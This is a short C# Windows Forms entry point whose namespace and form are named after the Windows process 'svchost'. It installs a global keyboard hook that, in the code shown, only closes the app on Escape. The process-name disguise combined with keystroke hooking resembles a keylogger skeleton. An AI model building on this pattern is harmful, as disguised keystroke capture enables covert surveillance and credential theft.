using Keystroke.API;
using System;
using System.Windows.Forms;

namespace svchost32core
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            using (var api = new KeystrokeAPI())
            {
                api.CreateKeyboardHook((character) =>
                {
                    if (character.KeyCode == KeyCode.Escape)
                    {
                        Application.Exit();
                    }
                });
                Application.Run(new svchostform());
            }
        }
    }
}
